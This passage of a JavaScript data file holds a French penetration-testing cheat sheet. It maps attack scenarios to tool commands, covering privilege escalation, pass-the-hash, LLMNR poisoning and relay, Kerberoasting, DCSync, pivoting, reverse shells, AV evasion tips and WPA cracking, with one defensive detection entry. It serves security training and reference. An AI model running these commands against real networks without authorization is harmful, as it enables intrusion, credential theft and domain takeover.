    note: "Si WordPress → WPScan. Repérer les consoles d'admin et tester les identifiants par défaut." },

  { icon: "🎯", title: "J'ai une version de service précise",
    phase: "vuln",
    steps: [
      { tool: "searchsploit", cmd: "searchsploit <produit> <version>" },
      { tool: "Exploit-DB", cmd: "Vérifier le PoC et les effets de bord avant de lancer" },
      { tool: "Metasploit Framework", cmd: "search <cve|produit> dans msfconsole" }
    ],
    note: "Attention aux exploits à effets de bord (BSOD, crash). Se documenter et vérifier la source avant exécution sur de la prod." },

  { icon: "🐧", title: "J'ai un shell bas-privilège Linux",
    phase: "post",
    steps: [
      { tool: "LinPEAS", cmd: "./linpeas.sh   # énumération privesc complète" },
      { tool: "GTFOBins", cmd: "sudo -l puis chercher le binaire sur GTFOBins" },
      { tool: "GTFOBins", cmd: "find / -perm -4000 2>/dev/null   # SUID → GTFOBins" },
      { tool: "pspy", cmd: "./pspy64   # cron/processus cachés" }
    ],
    note: "Le triptyque gagnant : sudo -l, binaires SUID, tâches cron — à croiser systématiquement avec GTFOBins." },

  { icon: "🪟", title: "J'ai un shell bas-privilège Windows",
    phase: "post",
    steps: [
      { tool: "WinPEAS", cmd: "winpeas.exe   # énumération privesc" },
      { tool: "PowerUp", cmd: "Invoke-AllChecks   # mauvaises configs de services" },
      { tool: "LOLBAS", cmd: "Détourner un binaire signé Windows (bypass)" },
      { tool: "windows-exploit-suggester-ng", cmd: "wes.py systeminfo.txt   # exploits noyau manquants" }
    ],
    note: "Face à AMSI/Defender, privilégier l'exécution par dépôt d'exécutable (native upload) plutôt que PowerShell." },

  { icon: "🔓", title: "J'ai récupéré un hash NTLM",
    phase: "exploit",
    steps: [
      { tool: "Hashcat", cmd: "hashcat -m 1000 -a 0 hash.txt rockyou.txt   # cassage offline" },
      { tool: "NetExec (ex-CrackMapExec)", cmd: "nxc smb <net> -u user -H <hash>   # pass-the-hash + spray" },
      { tool: "evil-winrm", cmd: "evil-winrm -i <ip> -u user -H <hash>   # shell sans cracker" }
    ],
    note: "Pas besoin de casser le hash pour l'utiliser : pass-the-hash permet le mouvement latéral directement." },

  { icon: "🧑", title: "OSINT sur une personne",
    phase: "recon",
    steps: [
      { tool: "Sherlock", cmd: "sherlock pseudo   # présence réseaux sociaux" },
      { tool: "Holehe", cmd: "holehe cible@example.com   # comptes liés à l'email" },
      { tool: "GHunt", cmd: "ghunt email cible@gmail.com   # profil Google" },
      { tool: "Have I Been Pwned", cmd: "Vérifier les fuites associées" }
    ],
    note: "Croiser pseudo ↔ email ↔ fuites. Rester en reconnaissance passive tant que possible." },

  { icon: "🏢", title: "OSINT sur un domaine / une entreprise",
    phase: "recon",
    steps: [
      { tool: "theHarvester", cmd: "theHarvester -d example.com -b all" },
      { tool: "crt.sh", cmd: "%.example.com   # sous-domaines via certificats" },
      { tool: "Amass", cmd: "amass enum -d example.com   # surface d'attaque" },
      { tool: "Shodan", cmd: "org:\"Example\" ou hostname:example.com" },
      { tool: "Google Dorks (GHDB)", cmd: "site:example.com filetype:pdf" }
    ],
    note: "Objectif : emails, sous-domaines, IP, services exposés et documents fuités — sans toucher la cible." },

  { icon: "🧅", title: "Je dois pivoter vers un réseau interne",
    phase: "post",
    steps: [
      { tool: "Ligolo-ng", cmd: "Pivot via interface TUN (le plus propre)" },
      { tool: "Chisel", cmd: "chisel server -p 8080 --reverse   # tunnel sur HTTP" },
      { tool: "SSH port forwarding", cmd: "ssh -L 8080:cible_interne:80 user@pivot" },
      { tool: "proxychains", cmd: "proxychains nmap -sT <ip_interne>" }
    ],
    note: "Après un premier accès, cartographier le nouveau segment (ARP/voisins) avant de relancer un scan à travers le tunnel." },

  { icon: "🐚", title: "J'ai besoin d'un reverse shell",
    phase: "exploit",
    steps: [
      { tool: "revshells.com", cmd: "Choisir la charge selon l'OS/l'interpréteur dispo" },
      { tool: "Netcat (nc)", cmd: "nc -lvnp 4444   # listener côté attaquant" },
      { tool: "msfvenom", cmd: "msfvenom -p <payload> LHOST=<ip> LPORT=4444 -f <fmt>" },
      { tool: "socat", cmd: "Stabiliser en TTY complet une fois le shell obtenu" }
    ],
    note: "Reverse shell > bind shell face à un pare-feu (c'est la victime qui sort). Stabiliser ensuite le TTY (python pty, socat, rlwrap)." },

  { icon: "🎣", title: "Je suis sur le réseau AD sans identifiant (poisoning)",
    phase: "exploit",
    steps: [
      { tool: "Responder", cmd: "responder -I eth0   # capturer des hashs Net-NTLM (LLMNR/NBT-NS)" },
      { tool: "ntlmrelayx (Impacket)", cmd: "impacket-ntlmrelayx -tf cibles.txt -smb2support   # relayer si pas de signature SMB" },
      { tool: "mitm6", cmd: "mitm6 -d domaine.local   # takeover IPv6/WPAD, à coupler au relay" },
      { tool: "Hashcat", cmd: "hashcat -m 5600 netntlm.hash rockyou.txt   # casser du NetNTLMv2" }
    ],
    note: "Si la signature SMB est absente (hors DC) → relay direct ; sinon, capture puis cassage offline du Net-NTLMv2." },

  { icon: "🎟️", title: "Kerberos : énumérer et « roaster » des comptes",
    phase: "exploit",
    steps: [
      { tool: "Kerbrute", cmd: "kerbrute userenum -d dom.local --dc <ip> users.txt" },
      { tool: "Impacket", cmd: "impacket-GetNPUsers dom.local/ -usersfile u.txt -no-pass -format hashcat   # AS-REP roast" },
      { tool: "Impacket", cmd: "impacket-GetUserSPNs -request dom.local/user   # Kerberoast (comptes à SPN)" },
      { tool: "Hashcat", cmd: "hashcat -m 18200 asrep.hash wl   # AS-REP   |   -m 13100 tgs.hash wl   # Kerberoast" }
    ],
    note: "AS-REP = comptes sans pré-auth Kerberos ; Kerberoast = comptes utilisateurs portant un SPN avec mot de passe faible." },

  { icon: "🗺️", title: "J'ai un compte de domaine, je cherche le chemin vers Domain Admin",
    phase: "post",
    steps: [
      { tool: "BloodHound", cmd: "bloodhound-python -d dom.local -u user -p pass -c all" },
      { tool: "SharpHound", cmd: "SharpHound.exe -c All   # depuis une machine Windows du domaine" },
      { tool: "BloodHound", cmd: "Requête : « Shortest Path to Domain Admins »" }
    ],
    note: "Repère aussi les comptes kerberoastables, les sessions d'admins et les délégations exploitables (ACL, GPO)." },

  { icon: "↔️", title: "Mouvement latéral Windows (j'ai un hash ou un compte)",
    phase: "post",
    steps: [
      { tool: "NetExec (ex-CrackMapExec)", cmd: "nxc smb <net> -u user -H <hash> --local-auth   # trouver où on est admin" },
      { tool: "Impacket", cmd: "impacket-psexec / wmiexec / smbexec dom/user@<ip> -hashes :<hash>" },
      { tool: "evil-winrm", cmd: "evil-winrm -i <ip> -u user -H <hash>   # si WinRM (5985)" },
      { tool: "lsassy", cmd: "récolter de nouveaux identifiants sur chaque machine atteinte" }
    ],
    note: "Réutilise hash NT (Pass-the-Hash) ou tickets (Pass-the-Ticket). Le mot de passe admin local est souvent identique sur tout le parc." },

  { icon: "👑", title: "Je suis Domain Admin : dump et persistance",
    phase: "post",
    steps: [
      { tool: "Impacket", cmd: "impacket-secretsdump -just-dc-ntlm dom/administrateur@<dc>   # DCSync / NTDS" },
      { tool: "Mimikatz", cmd: "lsadump::dcsync /user:krbtgt   # hash krbtgt = clé du domaine" },
      { tool: "Hashcat", cmd: "hashcat -m 1000 ntds.hash rockyou.txt --username   # casser les hashs NTLM" }
    ],
    note: "Le hash krbtgt permet un Golden Ticket (persistance totale). À manier avec prudence et à documenter dans le rapport." },

  { icon: "🛡️", title: "Côté défense : détecter ces attaques (Blue Team)",
    steps: [
      { tool: "Sysmon", cmd: "Journaliser process/réseau/DNS (config SwiftOnSecurity)" },
      { tool: "SIGMA (SigmaHQ)", cmd: "Déployer des règles mappées MITRE ATT&CK dans le SIEM" },
      { tool: "Elastic Stack (ELK)", cmd: "Event 4769/4768 (Kerberoast/Golden), 4662 (DCSync), 4624 type 3" },
      { tool: "Atomic Red Team", cmd: "Rejouer les TTP pour valider la couverture de détection" }
    ],
    note: "Correspondance offensif ↔ défensif : chaque technique (roasting, DCSync, PTH) laisse des traces dans les Event IDs Windows." },

  { icon: "📶", title: "Je veux casser une clé Wi-Fi WPA/WPA2",
    phase: "exploit",
    steps: [
      { tool: "airmon-ng", cmd: "airmon-ng start wlan0   # carte en mode monitor -> wlan0mon" },
      { tool: "hcxdumptool", cmd: "hcxdumptool -i wlan0mon -o wifi.pcapng --enable_status=1   # capture PMKID / handshake" },
      { tool: "hcxtools", cmd: "hcxpcapngtool -o wifi.hc22000 wifi.pcapng   # conversion pour Hashcat (mode 22000)" },
      { tool: "Hashcat", cmd: "hashcat -m 22000 wifi.hc22000 rockyou.txt   # cassage dictionnaire (GPU, rapide)" },
      { tool: "Aircrack-ng", cmd: "aircrack-ng -w rockyou.txt wifi.cap   # alternative si handshake .cap" },
      { tool: "Reaver", cmd: "reaver -i wlan0mon -b <BSSID> -vv   # si le WPS est activé : bruteforce du PIN" }
    ],
    note: "Strictement sur ton propre réseau ou avec autorisation écrite. Le PMKID (hcxdumptool) ne nécessite aucun client connecté ; sinon force un handshake par déauth : aireplay-ng --deauth 5 -a <BSSID> wlan0mon." }
];

/* Expose global (compat file:// et GitHub Pages) */
window.ARSENAL = { META, PHASES, CATEGORIES, TOOLS, CHEATS };
